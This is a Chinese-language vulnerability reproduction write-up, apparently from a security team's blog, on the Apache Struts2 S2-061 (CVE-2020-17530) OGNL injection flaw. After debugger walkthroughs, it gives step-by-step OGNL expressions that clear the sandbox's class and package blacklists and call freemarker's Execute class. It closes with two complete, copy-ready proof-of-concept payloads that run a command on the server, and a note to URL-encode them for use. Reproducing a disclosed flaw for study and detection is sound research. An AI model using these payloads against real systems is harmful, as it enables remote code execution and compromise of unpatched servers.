> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vG5-1u_5kBlRYGrORj5JeQ)

漏洞复现之 S2-061(CVE-2020-17530)
============================

```
1.本文为Gcow安全团队成员江城@复眼小组所写,未经允许禁止转载2.本文中的payload切勿用于违法行为 一切造成的不良影响 本公众号概不负责3.本文一共2000字 18张图 预计阅读时间7分钟4.若本文中存在不清楚或者错误的地方 欢迎各位师傅在公众号私聊中指出 感激不尽
```

#### 漏洞描述

本次漏洞是对`S2-059`漏洞修复后的绕过。`S2-059`的修复补丁仅修复了沙盒绕过，但是并没有修复 OGNL 表达式的执行。但是在最新版本`2.5.26`版本中 OGNL 表达式的执行也修复了。

#### 漏洞影响版本

`struts 2.0.0 - struts 2.5.25`

#### 漏洞分析

本文仅是对`S2-061`进行复现，并且对复现的过程进行记录，具体的分析思路可以参考 [安恒信息安全研究院 - Struts2 S2-061 漏洞分析 (CVE-2020-17530)](https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247485085&idx=1&sn=f264cf31bb82ae957fb985b754890d41&scene=21#wechat_redirect "安恒信息安全研究院-Struts2 S2-061漏洞分析(CVE-2020-17530)")

Smi1e 师傅 tql 膜了 呜呜呜

#### 漏洞复现

#### 测试环境

```
IDEA 2019.3.5    Struts2 2.5.26/Struts2 2.3.33    Apache-Tomcat-8.5.57
```

#### 相关依赖包

> 注意，搭建测试环境的时候，除了下载 struts2 的最小依赖包 (`struts-2.x.xx-min-lib.zip`) 以外，本次的环境，还需要依赖同版本包下的`commons-collections-x.x.jar`，可以在`struts-2.x.xx-lib.zip`中找到版本对应的包，后续会说明为什么一定需要这个包。

2.3.3 相关依赖包

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBQ5Hmh8avz8YqLrelEpQAu0G44aiaRPpzEOgMDY3Hibrhzu9YwjViaHUDA/640?wx_fmt=png)2.3.3 相关依赖包

2.5.25 相关依赖包

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBbX361ay90TvWjt5obgAjThT3sM2OP7ia6RwnAUY0vDrR16T17JKQLQQ/640?wx_fmt=png)2.5.25 相关依赖包

#### 复现思路简略说明（具体思路请移步上文中的漏洞分析文章）

1. 首先找到 **struts2** 标签解析的入口，也是我们本次漏洞 **Debug** 跟踪的重点。

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBLtCMgicK6mIMHtM9J1cZVOgkvkIhKoptMx29ZTPUicMDnIsTBooaeLcQ/640?wx_fmt=png)标签解析入口

全方法名：`org.apache.struts2.views.jsp.ComponentTagSupport#doStartTag`

这里是标签解析的开始方法，同时这里能够观测到整个`OgnlValueStack`对象，也是我们开始寻找利用点的地方。

其中我们本次要使用的利用点就 stack 中断点可以找到（这一步在前面的思路分析中可以找到，但是因为 debug 点没有描述清楚，一开始找了很久，最后在查阅其他版本的文章分析才找到这个位置）:

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBSb8o0wTTic2fowWfI6mD8HCmlyZfwOcL9L0MxzELZMYKY2lE2JCgWlA/640?wx_fmt=png)OgnlValueStack 内容查看

从上文中的位置，我们可以得到获取这个对象的获取调用链，如下图

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBTHnSVb38ibk0qN84nNvWBzsPsibRlv0wsiaOUjJl65bhibQQiam5VSLicVJQ/640?wx_fmt=png)找到 org.apache.tomcat.InstanceManager

转换为 ognl 表达式后如下：`#application.get('org.apache.tomcat.InstanceManager')`

1.`org.apache.catalina.core.DefaultInstanceManager` 的方法不做过多描述，借用分析文章中的一张图，可以使用这个对象中的`newInstance`方法实例化任意无参构造方法的类并返回。

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mB5vibAViabDtKbrFSxHJvtPicoUPbv5Gzt452c32sA31ZpWy7ibVf7evZibg/640?wx_fmt=png)DefaultInstanceManager 的 newInstance 方法

1. 创建`org.apache.commons.collections.BeanMap`对象 (本次的漏洞复现的主角，同时这个包就在`commons-collections-x.x.jar`中)

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mB4n7ODs07pOc2oyuCpsrLbF5pUfMGHwukSxE6M7Jxmib3Yu57MbHOGvQ/640?wx_fmt=png)BeanMap 重点方法

API 简要描述（若想看详细方法分析，请移步到上文的分析文章）:

```
Object get("xxxx")            实际相当于调用内部对象的getXxx,比如getName()       Object put("xxxx",Object)    实际相当于调用内部对象的,setXxxx,比如setName()       void setBean(Object)        重新设置内部对象，设置完成后上面两个才能生效       Object getBean()            获取内部对象，这里可以在断点的时候查看到当前map中的实际对象
```

整体创建的 Ognl 表达式（这里存放到 application 中，方便多次请求使用）

```
%{#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')}
```

1. 获取到`OgnlContext`对象 （实际就是`#attr` 、`#request` 等 map 对象中的 `struts.valueStack`）并且设置到上一步的 BeanMap 中，用于绕过沙盒限制，进行内部方法调用。

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBgUicpC3ljc1MGJibSbovJkAsuoTGEyyCKP3kTAhbtwlggzDXxicKQ6ibeQ/640?wx_fmt=png)valueStack 方法链

Ognl 表达式代码

```
%{#application.map.setBean(#request.get('struts.valueStack'))}
```

1. 使用 3 和 4 同样的原理，利用 `BeanMap`使用`com.opensymphony.xwork2.ognl.OgnlValueStack` 中的 `getContext` 方法间接获取到 `OgnlContext`, 并且重新设置到一个新的 BeanMap 中。

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBhFlhuYCmJDczhKjaZiaf7LQjJ2Gzg2RdGj0TZAWDV6WkcJFL26ODoxA/640?wx_fmt=png)OgnlValueStack 获取当前 OgnlContext 的方法

这里把两个步骤的 Ognl 代码同时贴出来

```
# 注意，自行调试的话，需要分两次执行   %{#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')}   %{#application.map2.setBean(#application.get('map').get('context'))}
```

1. 使用上面的原理，使用第二步得到的`OgnlContext`获取到内部的`com.opensymphony.xwork2.ognl.SecurityMemberAccess`对象，在设置到新的 BeanMap 中，用于重置黑名单

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBkBRWQ6B86OmpIuTj527hr6x3vma341EtuibPH5Bv9gTNbLHKKL5Js1g/640?wx_fmt=png)OgnlContext 获取 SecurityMemberAccess 的方法

```
# 注意，自行调试的话，需要分两次执行%{#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')}%{#application.map3.setBean(#application.get('map2').get('memberAccess'))}
```

1. 确认一下之前存放的 Map 都正确存下来了，不然岂不是白忙活，其实每一步执行完后，都可以查看一次，确认每一步都是操作正确的，这里我就一次过了。

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBEV8M5IJsyWq9tgwmoWkNbRl4OMlo3wBymuO94ZHDibPYCsOk56nncrg/640?wx_fmt=png)断点确认前面设置的数据，是否正确

1. 前面的操作都确认没有问题后，就可以调用方法重置黑名单了，主要 API 为`com.opensymphony.xwork2.ognl.SecurityMemberAccess#setExcludedClasses`和`com.opensymphony.xwork2.ognl.SecurityMemberAccess#setExcludedPackageNames`, 如下图

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBOKwHTvqC7TRIFUgsV0yO2MRicvNOhzTiamWecFGMmAWnCdbj2BBv4PtA/640?wx_fmt=png)设置黑名单的两个方法

在我们这两个地方打了断点后，我们请求下面或者前面的 ognl 可以发现，在每次收到请求的时候，都会调用一次这里的黑名单赋值，也就是说，就算是我们在本次请求重置了黑名单，在下次请求的时候，黑名单还是会重置。因此只有前面的 ognl 可以持久化存储，实际利用的时候，必须要在一个请求中进行命令执行。下文还会有一个存放在`request`中的 poc。

初次请求赋值:

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBAMmSnm4qP7LKDmA7sFd4p99vxCbpbXfhsse1tEvvFFfO8zV7BwwyqA/640?wx_fmt=png)自动重置黑名单 1![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mB53l2FiaXAw2ZPDecAaXcH41opic1pD43OyEwvEP4ib3YDRwp7r7BGhGog/640?wx_fmt=png) 自动重置黑名单 2

执行下面清空黑名单代码的重新赋值

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBSJ33iaWKUt5iamqf2MUq8ZSibzaiczI2ehc6HuYKJjwHRaNftFOoXX5tmA/640?wx_fmt=png)清空黑名单 1![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBzibkgGuvOwIpsT2pibw0oUNwca3icVw74npONHtRazUL1Iz3KtNawgyBA/640?wx_fmt=png) 清空黑名单 2

清 7 空黑名单的 ognl 代码

```
# 注意，自行调试的话，需要分两次执行   #application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet'))   #application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet'))
```

1. 这里就可以使用黑名单中的`freemarker.template.utility.Execute`类中的`exec`方法执行 Shell 了。需要最少和前面的 8 一起使用，才能执行成功。可以直接使用最后面的完整 poc 代码执行。

![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBkib0wCRcWcoaNqfw47KIJvYqm0PN2ria4nlTvNjictuWkxkXt1nANfyNA/640?wx_fmt=png)shell 代码断点查看![](https://mmbiz.qpic.cn/mmbiz_png/Tvn7G7hSv35lBxL3C8t2fDDvY1pXf5mBukoezkKFsQfKrrACjpNYofhMicyTp5PjJYtcXqISKOSAS1bmquwG6dw/640?wx_fmt=png) payload 执行结果

执行 shell 的 ognl 代码

```
#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'})
```

#### 完整 POC

#### 使用 application，就是上面思路的完整 POC

```
%{(#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +(#application.map2.setBean(#application.get('map').get('context')) == true).toString().substring(0,0) + (#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map3.setBean(#application.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))}
```

#### 使用 request，单次请求有效的完整 POC (推荐)

```
%{(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))}
```

> 注意：请使用 url 对以上的 OGNL 代码编码后，再在工具上使用。

#### 检测思路

在新版本的 struts2 中，已经不能通过参数构造来解析 ognl 表达式了，所以如果考虑想要使用脚本来进行批量扫描是否有本漏洞的时候，可以考虑直接爆破所有参数，然后判断页面中是否有预计的结果文本即可。

比如：

%{'gcowsec-' + (2000 + 20).toString()}

预计会得到

gcowsec-2020

使用脚本判断结果中是否包含就可以了

#### 总结

此次漏洞只是`S2-059`修复的一个绕过，并且本次利用的核心类`org.apache.commons.collections.BeanMap`在`commons-collections-x.x.jar`包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持 OGNL 表达式的注入点，但是如果没有使用这个依赖包，也还是没办法进行利用。

#### 参考文章

[安恒信息安全研究院 - Struts2 S2-061 漏洞分析 (CVE-2020-17530)](https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247485085&idx=1&sn=f264cf31bb82ae957fb985b754890d41&scene=21#wechat_redirect "安恒信息安全研究院-Struts2 S2-061漏洞分析(CVE-2020-17530)")

[官方更新公告]https://cwiki.apache.org/confluence/display/WW/S2-061

[Struts2-059 远程代码执行漏洞（CVE-2019-0230）分析]https://blog.csdn.net/weixin_46236101/article/details/109080913

[360-CVE-2020-17530: Apache Struts2 远程代码执行漏洞通告](https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&mid=2247488848&idx=1&sn=570129fd1b4a5d28a890205af795f5bd&scene=21#wechat_redirect "360-CVE-2020-17530: Apache Struts2 远程代码执行漏洞通告")